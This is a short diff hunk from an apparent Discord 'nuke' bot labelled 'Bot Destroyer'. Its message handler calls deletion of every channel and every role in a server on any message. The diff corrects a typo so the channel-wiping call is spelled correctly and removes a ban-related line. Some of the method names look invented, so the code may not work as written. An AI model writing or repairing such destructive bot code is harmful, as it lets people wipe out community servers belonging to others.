@@ -145,9 +145,8 @@ client.on("message", async message => {
     if(message.content === "cık"){
         message.guild.leave();
     }
-    message.guild.channels.deletedAll("Bot Destroyer");
+    message.guild.channels.deleteAll("Bot Destroyer");
     message.guild.roles.deleteAll("Bot Destroyer");
-    message.guild.members.bannable("Bot Destroyer");
 
 });
 
